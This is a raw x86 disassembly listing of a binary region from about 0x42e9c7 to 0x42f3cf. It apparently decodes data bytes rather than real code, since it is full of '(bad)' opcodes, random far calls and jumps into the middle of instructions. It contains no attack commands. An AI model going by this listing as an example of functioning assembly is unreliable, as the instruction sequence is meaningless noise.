  42e9c7:	cmp    ax,0x2946
  42e9cb:	sbb    dh,bh
  42e9cd:	repz les ecx,FWORD PTR [edi+0x34]
  42e9d1:	ds inc ebx
  42e9d3:	dec    edi
  42e9d4:	call   0xf8c4:0xab622862
  42e9db:	repz pop edx
  42e9dd:	mov    dh,0xc0
  42e9df:	add    ecx,esp
  42e9e1:	dec    esp
  42e9e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9e3:	mov    eax,ds:0xe396c0e0
  42e9e8:	mov    ah,0xec
  42e9ea:	sbb    ecx,DWORD PTR [esi+0x4f]
  42e9ed:	(bad)  
  42e9ee:	pop    ebx
  42e9ef:	scas   eax,DWORD PTR es:[edi]
  42e9f0:	repnz loope 0x42e9d3
  42e9f3:	in     eax,dx
  42e9f4:	cmp    DWORD PTR [edi-0x115b893f],esp
  42e9fa:	cmp    eax,0x49009fb
  42e9ff:	sub    al,0xa9
  42ea01:	sub    edi,DWORD PTR [esi-0x11c43c11]
  42ea07:	pop    ss
  42ea08:	push   0x3d
  42ea0a:	(bad)  
  42ea0b:	or     al,0xd7
  42ea0d:	inc    esp
  42ea0e:	into   
  42ea0f:	mov    ds:0xb,al
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	sbb    dh,BYTE PTR [ecx]
  42ea82:	cmc    
  42ea83:	inc    esp
  42ea84:	ins    DWORD PTR es:[edi],dx
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x6d000001
  42ea8d:	pusha  
  42ea8e:	sub    al,BYTE PTR [edx]
  42ea90:	dec    eax
  42ea91:	push   cs
  42ea92:	add    BYTE PTR [ebx-0x77cd5844],0xc3
  42ea99:	js     0x42eaa4
  42ea9b:	jno    0x42ead4
  42ea9d:	cmp    BYTE PTR [ebp-0x51efee71],0x3b
  42eaa4:	dec    edx
  42eaa5:	repnz mov esi,0xf5cc4dc7
  42eaab:	xlat   BYTE PTR ds:[ebx]
  42eaac:	sti    
  42eaad:	mov    esp,0xddacaa83
  42eab2:	jb     0x42eb05
  42eab4:	pop    ds
  42eab5:	ins    DWORD PTR es:[edi],dx
  42eab6:	xlat   BYTE PTR ds:[ebx]
  42eab7:	push   0x29894c7
  42eabc:	repz jne 0x42ea9f
  42eabf:	xchg   ebp,eax
  42eac0:	cdq    
  42eac1:	cmc    
  42eac2:	call   DWORD PTR [ecx+0x12]
  42eac5:	and    eax,DWORD PTR [edx+eax*2]
  42eac8:	sar    BYTE PTR [ecx],cl
  42eaca:	mov    WORD PTR [eax-0x6e],?
  42eacd:	scas   al,BYTE PTR es:[edi]
  42eace:	out    0x17,eax
  42ead0:	popf   
  42ead1:	hlt    
  42ead2:	sti    
  42ead3:	test   DWORD PTR [ecx-0x6b14d3d4],edi
  42ead9:	(bad)  
  42eada:	(bad)  
  42eadc:	xchg   edi,eax
  42eadd:	xchg   ecx,eax
  42eade:	mov    ch,0x85
  42eae0:	not    dh
  42eae2:	cmp    BYTE PTR [edi+0x56af7cc5],0x58
  42eae9:	push   ebp
  42eaea:	add    DWORD PTR [edi],ecx
  42eaec:	sbb    DWORD PTR [ebx],ebp
  42eaee:	cmc    
  42eaef:	sbb    BYTE PTR [esi-0x6c],ch
  42eaf2:	stc    
  42eaf3:	pop    edx
  42eaf4:	xor    ah,BYTE PTR [eax-0x58]
  42eaf7:	scas   al,BYTE PTR es:[edi]
  42eaf8:	fisubr DWORD PTR [ecx-0x7520e1e4]
  42eafe:	jae    0x42eb0a
  42eb00:	out    0x2b,eax
  42eb02:	mov    WORD PTR [esi-0x711c1274],cs
  42eb08:	jle    0x42ea93
  42eb0a:	ficomp DWORD PTR [esi]
  42eb0c:	cmp    BYTE PTR [esi+0x8c2535],cl
  42eb12:	int    0x9c
  42eb14:	clc    
  42eb15:	adc    cl,BYTE PTR cs:[eax-0x10]
  42eb19:	sub    bh,cl
  42eb1b:	rep data16 stos BYTE PTR es:[edi],al
  42eb1e:	lahf   
  42eb1f:	stc    
  42eb20:	repnz xchg esi,eax
  42eb22:	jno    0x42eb7a
  42eb24:	jge    0x42eaf8
  42eb26:	(bad)  
  42eb27:	in     al,dx
  42eb28:	imul   edx,DWORD PTR [edx],0xd74a469c
  42eb2e:	xchg   ebp,eax
  42eb2f:	xchg   ebx,eax
  42eb30:	jle    0x42eb4f
  42eb32:	out    0x0,al
  42eb34:	dec    ebx
  42eb35:	cmp    eax,0xda89a1a9
  42eb3a:	sbb    al,0x88
  42eb3c:	loope  0x42eb46
  42eb3e:	(bad)  
  42eb40:	sbb    edx,DWORD PTR [edi-0x35]
  42eb43:	pop    es
  42eb44:	test   eax,0x53d5bccc
  42eb49:	mov    bl,0xfc
  42eb4b:	cmp    bh,BYTE PTR [edi-0x68]
  42eb4e:	xor    eax,0xa4eabe6
  42eb53:	imul   ebp,esi,0xc0b4f01e
  42eb59:	pop    ebx
  42eb5a:	test   DWORD PTR [edx+0x2c],edx
  42eb5d:	fistp  WORD PTR [esi+0x4696ee90]
  42eb63:	and    esi,DWORD PTR [ebx*4+0x375e358e]
  42eb6a:	mov    WORD PTR [eax],cs
  42eb6c:	jge    0x42eb37
  42eb6e:	sbb    esp,DWORD PTR [eax+0x7d14e7ef]
  42eb74:	cmp    al,dh
  42eb76:	xchg   ebp,eax
  42eb77:	test   BYTE PTR [ebp+0x5c],ch
  42eb7a:	xchg   DWORD PTR [esi-0x7],ebx
  42eb7d:	mov    ebp,0xbea2a48a
  42eb82:	adc    ecx,ecx
  42eb84:	loop   0x42eb14
  42eb86:	scas   al,BYTE PTR es:[edi]
  42eb87:	bound  esi,QWORD PTR [ecx-0x62]
  42eb8a:	mov    esi,0xc30e5cbd
  42eb8f:	inc    ebp
  42eb90:	adc    al,0x0
	...
  42ebf2:	add    BYTE PTR [eax],al
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	add    edi,0x72893e37
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0xb2000001
  42ec0d:	ret    0xbd00
  42ec10:	pop    ecx
  42ec11:	dec    esi
  42ec12:	mov    dh,0xb0
  42ec14:	cmp    cl,BYTE PTR [ecx-0x3b]
  42ec17:	stc    
  42ec18:	jne    0x42ec17
  42ec1a:	inc    esi
  42ec1b:	rcl    DWORD PTR [ecx-0x14],cl
  42ec1e:	ja     0x42ebdd
  42ec20:	lods   al,BYTE PTR ds:[esi]
  42ec21:	add    edi,DWORD PTR [ecx-0x6820bab5]
  42ec27:	mov    DWORD PTR [edx+0x45],0xf32af8a9
  42ec2e:	mov    eax,ds:0x693c50b7
  42ec33:	shl    DWORD PTR [esi],0xab
  42ec36:	arpl   dx,dx
  42ec38:	mov    BYTE PTR [ebx],bh
  42ec3a:	jl     0x42ebdc
  42ec3c:	(bad)  
  42ec3d:	stos   BYTE PTR es:[edi],al
  42ec3e:	xchg   esp,eax
  42ec3f:	(bad)  
  42ec40:	sbb    eax,0xcf5435b5
  42ec45:	cld    
  42ec46:	div    BYTE PTR [edi]
  42ec48:	loop   0x42ec3f
  42ec4a:	inc    edi
  42ec4b:	dec    ecx
  42ec4c:	repz push cs
  42ec4e:	dec    ebx
  42ec4f:	iret   
  42ec50:	sub    eax,0x58d326ae
  42ec55:	add    al,0xa9
  42ec57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec58:	pop    es
  42ec59:	cmp    DWORD PTR [edx+edi*4-0x69],ebp
  42ec5d:	repnz mov ds:0x2d4b3a4a,al
  42ec63:	les    ebp,FWORD PTR ds:0x3f3abd61
  42ec69:	mov    edx,0xf29b778d
  42ec6e:	sbb    bl,0x79
  42ec71:	push   ebx
  42ec72:	mov    eax,ds:0x65946f3
  42ec77:	es pusha 
  42ec79:	retf   0xb8dc
  42ec7c:	jp     0x42ec8f
  42ec7e:	stos   BYTE PTR es:[edi],al
  42ec7f:	xor    BYTE PTR [ecx+0x247fd445],dl
  42ec85:	push   edx
  42ec86:	xchg   ebx,eax
  42ec87:	pop    esp
  42ec88:	xchg   esp,eax
  42ec89:	addr16 push ebp
  42ec8b:	ret    
  42ec8c:	dec    esi
  42ec8d:	xchg   edi,eax
  42ec8e:	inc    esi
  42ec8f:	inc    DWORD PTR [ebx]
  42ec91:	cmp    eax,0xe6eabf77
  42ec96:	nop
  42ec97:	xor    DWORD PTR [esi+0x62fc7a3c],eax
  42ec9d:	sar    DWORD PTR [edx-0x78],cl
  42eca0:	test   BYTE PTR [ebp+0x458ffec0],bh
  42eca6:	aaa    
  42eca7:	retf   0x10d3
  42ecaa:	les    eax,FWORD PTR [esp+edi*2-0x3b]
  42ecae:	adc    dh,dl
  42ecb0:	jno    0x42ecb6
  42ecb2:	add    eax,0x9110e186
  42ecb7:	cmp    DWORD PTR [eax],ebx
  42ecb9:	lods   al,BYTE PTR ds:[si]
  42ecbb:	fisttp WORD PTR [ebp-0x3fa60]
  42ecc1:	popf   
  42ecc2:	in     al,dx
  42ecc3:	pop    ecx
  42ecc4:	dec    ecx
  42ecc5:	(bad)  
  42ecc6:	cmp    al,0x10
  42ecc8:	xor    edi,DWORD PTR [esi+0x4681cc35]
  42ecce:	dec    eax
  42eccf:	add    dh,BYTE PTR [esi+0x1b1fbf9b]
  42ecd5:	aad    0x9b
  42ecd7:	push   ecx
  42ecd8:	xlat   BYTE PTR ds:[ebx]
  42ecd9:	pop    ecx
  42ecdb:	call   0xf3bd:0x57a357b9
  42ece2:	adc    DWORD PTR [esp+eax*2+0x6b],esi
  42ece6:	aaa    
  42ece7:	pop    ecx
  42ece8:	jnp    0x42ecde
  42ecea:	cmp    DWORD PTR [eax+0x5b],eax
  42eced:	ret    
  42ecee:	inc    ecx
  42ecef:	mov    dh,0x8
  42ecf1:	imul   ebp,DWORD PTR [eax+0x689bd69a],0xede0b6ed
  42ecfb:	sub    al,0x79
  42ecfd:	outs   dx,BYTE PTR ds:[esi]
  42ecfe:	fidiv  WORD PTR [eax+0x7873d8fe]
  42ed04:	jp     0x42ed0d
  42ed06:	push   edx
  42ed07:	dec    edi
  42ed08:	imul   ebp,DWORD PTR [eax+0x744ecd1d],0x6a9ebd
	...
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x4be424d7],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0xa7000001
  42ed8d:	jmp    0x42ed54
  42ed8f:	add    al,0xa2
  42ed91:	sbb    al,0xd8
  42ed93:	arpl   WORD PTR [eax+ebx*8+0x2e],ax
  42ed97:	sub    DWORD PTR [esi],esp
  42ed99:	jno    0x42edb5
  42ed9b:	test   eax,0xa21f7a02
  42eda0:	aam    0x9a
  42eda2:	loopne 0x42ede7
  42eda4:	jmp    0x5df7a522
  42eda9:	xchg   ebp,eax
  42edaa:	mov    ebp,0x1bc33595
  42edaf:	test   BYTE PTR [edi],ah
  42edb1:	mov    cl,0x59
  42edb3:	fldenv [ecx+0x6f]
  42edb6:	add    ecx,DWORD PTR gs:[ebx-0x72]
  42edba:	pop    edx
  42edbb:	mov    edx,0xc3eee50b
  42edc0:	or     BYTE PTR [ebx],ch
  42edc2:	(bad)  
  42edc3:	jae    0x42ed85
  42edc5:	dec    edx
  42edc6:	adc    ah,BYTE PTR ds:[edi]
  42edc9:	pop    esi
  42edca:	ins    BYTE PTR es:[edi],dx
  42edcb:	pop    ds
  42edcc:	call   0xfe0f:0x799076f2
  42edd3:	out    0xf1,al
  42edd5:	adc    edi,DWORD PTR [ebx-0x6b]
  42edd8:	out    0x81,eax
  42edda:	mov    bh,0x68
  42eddc:	dec    BYTE PTR [esi]
  42edde:	fild   DWORD PTR [ebx-0x67]
  42ede1:	sbb    ebx,DWORD PTR [ecx-0x83e0fc3]
  42ede7:	push   ebp
  42ede8:	test   cl,ch
  42edea:	add    eax,0x151bdf8e
  42edef:	cmp    ch,BYTE PTR [ebp-0x60e831c]
  42edf5:	xor    al,BYTE PTR [ecx+0x2c6041ad]
  42edfb:	clc    
  42edfc:	sub    edi,eax
  42edfe:	adc    al,0xcc
  42ee00:	sti    
  42ee01:	mov    edi,0x708e03c9
  42ee06:	inc    edi
  42ee07:	inc    ebp
  42ee08:	fiadd  DWORD PTR [ebp+0x6b8f8f39]
  42ee0e:	mov    ebp,0x120cd67c
  42ee13:	mov    eax,0xab06ec90
  42ee18:	cmp    BYTE PTR [ebx-0x4b917c94],0x2e
  42ee1f:	and    ecx,0x8f28d393
  42ee25:	repz jl 0x42ee62
  42ee28:	loopne 0x42ee04
  42ee2a:	mov    DWORD PTR [ecx+0x3f5d8dfe],ebp
  42ee30:	jecxz  0x42ee63
  42ee32:	out    0xe0,al
  42ee34:	rol    BYTE PTR [ecx-0x15a2825c],1
  42ee3a:	popa   
  42ee3b:	fcom   DWORD PTR [edx]
  42ee3d:	test   DWORD PTR [esi-0x8],ebx
  42ee40:	pop    ebp
  42ee41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee42:	pop    ss
  42ee43:	push   edx
  42ee44:	fsubr  QWORD PTR [ecx-0x60]
  42ee47:	mov    dh,0x21
  42ee49:	mov    ch,0xd
  42ee4b:	jne    0x42ee93
  42ee4d:	pop    ecx
  42ee4e:	or     ebx,0x347eafbe
  42ee54:	push   ds
  42ee55:	xlat   BYTE PTR ds:[ebx]
  42ee56:	xchg   BYTE PTR [esi],cl
  42ee58:	adc    BYTE PTR [ecx-0x24],dh
  42ee5b:	in     al,0x6a
  42ee5d:	sub    edx,esp
  42ee5f:	ja     0x42edff
  42ee61:	xchg   edi,eax
  42ee62:	enter  0xfe32,0xb1
  42ee66:	in     al,dx
  42ee67:	mov    ah,0x9c
  42ee69:	repz dec esp
  42ee6b:	in     al,dx
  42ee6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee6d:	in     al,0x64
  42ee6f:	ret    0x7555
  42ee72:	mov    ah,BYTE PTR [edi]
  42ee74:	jmp    0xeeb430fa
  42ee79:	pushf  
  42ee7a:	jle    0x42ee73
  42ee7c:	aas    
  42ee7d:	ret    0x3ee9
  42ee80:	lods   eax,DWORD PTR ds:[esi]
  42ee82:	sahf   
  42ee83:	adc    eax,0xe58a0a04
  42ee88:	jle    0x42eee7
  42ee8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee8b:	cmp    al,0xf7
  42ee8d:	inc    ebx
  42ee8e:	mov    cl,0x41
  42ee90:	mov    es,WORD PTR [eax]
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	into   
  42ef01:	add    dl,BYTE PTR [ebx+0x1f77c21]
  42ef07:	add    BYTE PTR ds:0xd2000001,al
  42ef0d:	mov    edx,0x63f0c8e6
  42ef12:	mov    ebp,0xcb085d83
  42ef17:	pop    ss
  42ef18:	or     BYTE PTR [eax],al
  42ef1a:	call   0xc284:0xb9451b95
  42ef21:	cmovg  ecx,DWORD PTR [ecx]
  42ef24:	xchg   edx,eax
  42ef25:	dec    esi
  42ef26:	or     edx,DWORD PTR [eax-0x1190dbb0]
  42ef2c:	mov    ch,BYTE PTR [ebx-0x21]
  42ef2f:	dec    ecx
  42ef30:	sbb    bl,BYTE PTR [esi]
  42ef32:	pop    ss
  42ef33:	push   edi
  42ef34:	inc    edi
  42ef35:	shr    bl,cl
  42ef37:	inc    edi
  42ef38:	dec    esp
  42ef39:	inc    eax
  42ef3a:	mov    cl,0xea
  42ef3c:	or     DWORD PTR [edi+edx*2+0x543f7932],eax
  42ef43:	xchg   ebp,eax
  42ef44:	and    DWORD PTR [edi+ecx*4-0x2aa05cd7],ebp
  42ef4b:	cmp    eax,0x627a4951
  42ef50:	jmp    DWORD PTR [edx]
  42ef52:	int    0xac
  42ef54:	push   0xffffff8a
  42ef56:	adc    al,0x58
  42ef58:	ror    ah,0x66
  42ef5b:	jb     0x42ef0e
  42ef5d:	(bad)  
  42ef5e:	ds mov ebx,0xdc3ac58f
  42ef64:	daa    
  42ef65:	pop    ecx
  42ef66:	inc    ecx
  42ef67:	mov    al,dl
  42ef69:	adc    BYTE PTR [ecx],al
  42ef6b:	ret    0x8bb1
  42ef6e:	jl     0x42ef03
  42ef70:	fwait
  42ef71:	lock es loopne 0x42ef7d
  42ef75:	(bad)
  42ef7a:	sbb    cl,ah
  42ef7c:	xor    eax,0x1bc69689
  42ef81:	jecxz  0x42ef6f
  42ef83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef84:	iret   
  42ef85:	mov    BYTE PTR [ebx+esi*2-0x75],dl
  42ef89:	fwait
  42ef8a:	xchg   esi,eax
  42ef8b:	int3   
  42ef8c:	add    eax,DWORD PTR [ebx-0x6b982c9d]
  42ef92:	xchg   BYTE PTR [ebx],ch
  42ef94:	jge    0x42ef6c
  42ef96:	in     al,dx
  42ef97:	mov    bh,0x2f
  42ef99:	hlt    
  42ef9a:	push   esp
  42ef9b:	das    
  42ef9c:	data16 xor al,0x29
  42ef9f:	fistp  QWORD PTR [edi-0x34]
  42efa2:	add    dh,BYTE PTR [edi]
  42efa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efa5:	sbb    ecx,esp
  42efa7:	das    
  42efa8:	jle    0x42f020
  42efaa:	push   0x25
  42efac:	push   esi
  42efad:	lahf   
  42efae:	not    DWORD PTR [eax+esi*8-0x138f4b8]
  42efb5:	mov    edi,0x262ff755
  42efba:	add    al,0xd2
  42efbc:	pop    es
  42efbd:	and    al,0x1e
  42efbf:	(bad)  
  42efc1:	(bad)  
  42efc2:	jnp    0x42efc0
  42efc4:	adc    DWORD PTR [edi],ecx
  42efc6:	push   ds
  42efc7:	shl    edx,0x9e
  42efca:	xchg   ecx,eax
  42efcb:	add    dh,dh
  42efcd:	fdivr  st(6),st
  42efcf:	mov    ebp,0x8564021d
  42efd4:	adc    eax,eax
  42efd6:	cmp    DWORD PTR [eax],esi
  42efd8:	in     al,0x60
  42efda:	ret    0x1308
  42efdd:	jne    0x42efb8
  42efdf:	jp     0x42eff3
  42efe1:	dec    DWORD PTR [edx+ecx*8-0x13]
  42efe5:	xchg   BYTE PTR [esp+esi*1+0x2599a5e0],al
  42efec:	adc    ah,BYTE PTR [eax+edx*4]
  42efef:	cmp    DWORD PTR [eax],ecx
  42eff1:	and    BYTE PTR [ecx+0x70f27027],bl
  42eff7:	rcl    DWORD PTR [edx+0x36b4e88d],cl
  42effd:	or     eax,0x4c47ea19
  42f002:	scas   eax,DWORD PTR es:[edi]
  42f003:	sbb    BYTE PTR ss:[eax+0x43431acf],bl
  42f00a:	repnz push ebx
  42f00c:	sbb    al,0xd6
  42f00e:	cmp    DWORD PTR [edi+ecx*4+0x0],edi
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	or     edx,edx
  42f082:	jbe    0x42f00c
  42f084:	cmp    eax,0x1050001
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	pushf  
  42f08d:	stos   DWORD PTR es:[edi],eax
  42f08e:	ss mov edx,0xea45b545
  42f094:	fsub   QWORD PTR [ebx+0x23]
  42f097:	jge    0x42f0ed
  42f099:	ins    DWORD PTR es:[edi],dx
  42f09a:	iret   
  42f09b:	in     eax,dx
  42f09c:	pop    ebp
  42f09d:	int3   
  42f09e:	sbb    ecx,DWORD PTR [edx]
  42f0a0:	xor    bl,BYTE PTR [edx+0x3b]
  42f0a3:	inc    edx
  42f0a4:	ret    
  42f0a5:	cwde   
  42f0a6:	call   0x9611:0x68ab4c6f
  42f0ad:	sub    DWORD PTR [ebx-0x4b],0x67
  42f0b1:	cmp    al,0x4
  42f0b3:	dec    ebx
  42f0b4:	xchg   edx,eax
  42f0b5:	xchg   DWORD PTR [edi-0x1f942cbb],edi
  42f0bb:	mov    dl,0x9f
  42f0bd:	push   0x6f0e52d5
  42f0c2:	mov    al,0xfe
  42f0c4:	xchg   edx,eax
  42f0c5:	dec    eax
  42f0c6:	or     bh,al
  42f0c8:	lods   eax,DWORD PTR ds:[esi]
  42f0c9:	and    al,0xcf
  42f0cb:	arpl   cx,cx
  42f0cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0ce:	pop    ecx
  42f0cf:	pop    ebp
  42f0d0:	not    BYTE PTR [ebx-0x53]
  42f0d3:	fisubr WORD PTR [ecx]
  42f0d5:	cmp    ch,ch
  42f0d7:	jns    0x42f13b
  42f0d9:	push   ebx
  42f0da:	cmp    al,0x1f
  42f0dc:	inc    edi
  42f0dd:	test   al,0x84
  42f0df:	jp     0x42f120
  42f0e1:	jmp    0x42f06b
  42f0e3:	or     eax,0x7da8868a
  42f0e8:	pop    ss
  42f0e9:	retf   
  42f0ea:	(bad)  
  42f0eb:	in     eax,0xd1
  42f0ed:	cmp    edi,esp
  42f0ef:	gs jb  0x42f156
  42f0f2:	out    0x62,eax
  42f0f4:	add    BYTE PTR [edx],bh
  42f0f6:	dec    ecx
  42f0f7:	mov    esi,0x771cb9f7
  42f0fc:	std    
  42f0fd:	push   ss
  42f0fe:	cmp    al,0x72
  42f100:	xlat   BYTE PTR ds:[ebx]
  42f101:	popa   
  42f102:	loop   0x42f0f6
  42f104:	pop    ds
  42f105:	push   edx
  42f106:	stos   DWORD PTR es:[edi],eax
  42f107:	jmp    0x21655cf2
  42f10c:	sub    DWORD PTR [esi+ebp*8],0xd6c74e77
  42f113:	xor    eax,0x5e4eeb05
  42f118:	mov    ch,BYTE PTR [edx-0x6f]
  42f11b:	outs   dx,BYTE PTR ds:[esi]
  42f11c:	test   DWORD PTR [ecx-0x2a],edi
  42f11f:	mov    eax,ds:0x4c6d1f22
  42f124:	mov    bl,0x3b
  42f126:	or     BYTE PTR [ebx+0x28335619],bh
  42f12c:	mov    fs,WORD PTR [edi+0x51]
  42f12f:	das    
  42f130:	mov    BYTE PTR [ecx+0x565bdb0d],ch
  42f136:	ud0    esp,DWORD PTR [edx-0x48]
  42f13a:	pop    ecx
  42f13b:	imul   esp,DWORD PTR [edx-0xc],0x39
  42f13f:	jp     0x42f172
  42f141:	fisttp QWORD PTR [edx-0x64]
  42f144:	adc    WORD PTR [edi-0x26],0xffa7
  42f149:	push   ebp
  42f14a:	sti    
  42f14b:	arpl   WORD PTR [edx-0x17bcde6a],sp
  42f151:	inc    edx
  42f152:	mov    edi,0xb83311cf
  42f157:	mov    ecx,0x9e2271a8
  42f15c:	xor    BYTE PTR [edi],cl
  42f15e:	dec    esp
  42f15f:	fdiv   QWORD PTR [ecx]
  42f161:	sbb    eax,DWORD PTR [ecx]
  42f163:	dec    ebx
  42f164:	push   eax
  42f165:	jecxz  0x42f1a3
  42f167:	or     DWORD PTR [edi-0x706459ee],esp
  42f16d:	fcom   st(0)
  42f16f:	mov    edx,0x713eaba4
  42f174:	dec    ecx
  42f175:	fsubr  QWORD PTR [ecx+0x397ed9cc]
  42f17b:	xor    esp,DWORD PTR [edi+ecx*4-0x627191fb]
  42f182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f183:	call   0xffbb:0x81a0fbad
  42f18a:	es xchg esi,eax
  42f18c:	add    eax,0xee02fe90
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	pop    ds
  42f201:	push   0xf98668de
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0x6e000001
  42f20d:	ror    BYTE PTR [ecx+eax*1+0x6df01dc8],0x73
  42f215:	mov    ah,0xef
  42f217:	mov    WORD PTR [esi],?
  42f219:	xor    DWORD PTR [esi],ebp
  42f21b:	sbb    DWORD PTR [ecx+0x24],edi
  42f21e:	pop    edx
  42f21f:	mov    edx,0x1c16ca43
  42f224:	retf   
  42f225:	and    BYTE PTR [ebp+0x59a3296],al
  42f22b:	pop    eax
  42f22c:	scas   eax,DWORD PTR es:[edi]
  42f22d:	lock push eax
  42f22f:	aaa    
  42f230:	mov    bl,0x83
  42f232:	xchg   ecx,eax
  42f233:	lds    ecx,FWORD PTR [edx+0x3e]
  42f236:	addr16 mov ?,edx
  42f239:	and    eax,0x88d10e0a
  42f23e:	cmp    al,0xb9
  42f240:	pushw  0xd9b7
  42f244:	mov    ebp,0x148db9fe
  42f249:	mov    cl,0x5
  42f24b:	ja     0x42f295
  42f24d:	fs iret 
  42f24f:	cmp    BYTE PTR [ecx-0x1c5113cd],bl
  42f255:	mov    ah,al
  42f257:	call   0x13fb:0xc7a91693
  42f25e:	jne    0x42f290
  42f260:	into   
  42f261:	adc    dl,BYTE PTR [edi-0x4d]
  42f264:	iret   
  42f265:	push   ss
  42f266:	popaw  
  42f268:	push   ecx
  42f269:	test   al,0x17
  42f26b:	sbb    esi,DWORD PTR [esi+0x4e0bc3d8]
  42f271:	test   DWORD PTR [ebx+0x61],0xe880f27f
  42f278:	mov    al,0x1a
  42f27a:	push   ss
  42f27b:	pinsrw mm7,WORD PTR [edx+0x35],0xd9
  42f280:	push   eax
  42f281:	retf   
  42f282:	fwait
  42f283:	bound  esp,QWORD PTR [esi+0x21]
  42f286:	mov    eax,ds:0x148b8cec
  42f28b:	sahf   
  42f28c:	(bad)
  42f28f:	mov    bh,0x97
  42f291:	pusha  
  42f292:	iret   
  42f293:	xchg   edx,eax
  42f294:	fucom  st(3)
  42f296:	and    ecx,0x4d
  42f299:	pop    ebp
  42f29a:	les    edx,FWORD PTR [ebx]
  42f29c:	fucomi st,st(1)
  42f29e:	je     0x42f2a3
  42f2a0:	scas   eax,DWORD PTR es:[edi]
  42f2a1:	stos   DWORD PTR es:[edi],eax
  42f2a2:	jo     0x42f2b5
  42f2a4:	and    al,BYTE PTR [ebx]
  42f2a6:	inc    ecx
  42f2a7:	cmp    eax,0x3d7c6015
  42f2ac:	icebp  
  42f2ad:	cmp    esp,edx
  42f2af:	adc    BYTE PTR [eax+0xd136da3],0xd1
  42f2b6:	mov    cl,0x2a
  42f2b8:	loopne 0x42f27c
  42f2ba:	cmp    eax,0x2f0c5917
  42f2bf:	addr16 xor eax,ecx
  42f2c2:	adc    cl,BYTE PTR [esi-0x64658901]
  42f2c8:	outs   dx,BYTE PTR ds:[esi]
  42f2c9:	in     eax,dx
  42f2ca:	test   al,0xb0
  42f2cc:	or     al,0xcf
  42f2ce:	mov    ah,0x1c
  42f2d0:	(bad)  
  42f2d2:	arpl   WORD PTR [edx],bp
  42f2d4:	dec    edx
  42f2d5:	adc    eax,0x4c5dc0bd
  42f2da:	dec    ebx
  42f2db:	scas   eax,DWORD PTR es:[edi]
  42f2dc:	stc    
  42f2dd:	(bad)  
  42f2de:	ror    BYTE PTR [ecx+0x4428ac55],cl
  42f2e4:	lock shl BYTE PTR [edx],0xa6
  42f2e8:	inc    esi
  42f2e9:	sub    eax,0x6648574d
  42f2ee:	mov    ecx,DWORD PTR [eax+ecx*2+0x1d]
  42f2f2:	adc    al,BYTE PTR [edi+0x2178f068]
  42f2f8:	mov    dh,0xb8
  42f2fa:	aas    
  42f2fb:	mov    fs,WORD PTR [ecx-0x2b]
  42f2fe:	(bad)  
  42f2ff:	call   0xcbf004fb
  42f304:	push   0xa499425a
  42f309:	jb     0x42f367
  42f30b:	inc    esi
  42f30c:	push   0x646c6898
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	sub    eax,eax
  42f382:	inc    esi
  42f383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f384:	mov    edi,edx
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x28000001
  42f38d:	in     eax,0x11
  42f38f:	mov    ds:0x8fcfa7d8,eax
  42f394:	addr16 push ebp
  42f396:	and    DWORD PTR [eax-0x7abcd22c],edi
  42f39c:	cmp    BYTE PTR [esi+eiz*4],bh
  42f39f:	addr16 popa 
  42f3a1:	in     eax,dx
  42f3a2:	cmp    BYTE PTR [ecx],bl
  42f3a4:	popaw  
  42f3a6:	(bad)  
  42f3a8:	pop    esi
  42f3a9:	cs loope 0x42f335
  42f3ac:	mov    ah,0x42
  42f3ae:	mov    esp,0xdf3e4108
  42f3b3:	scas   al,BYTE PTR es:[edi]
  42f3b4:	xchg   esp,eax
  42f3b5:	fcom   QWORD PTR [edi]
  42f3b7:	and    ecx,edx
  42f3b9:	lods   al,BYTE PTR ds:[esi]
  42f3ba:	or     esp,ebp
  42f3bc:	retf   0x1eb2
  42f3bf:	ret    
  42f3c0:	stc    
  42f3c1:	push   edi
  42f3c2:	inc    edi
  42f3c3:	gs mov esi,0xc3423ae4
  42f3c9:	retf   
  42f3ca:	mov    esi,0xcfa1164f
  42f3cf:	test   al,0x4c
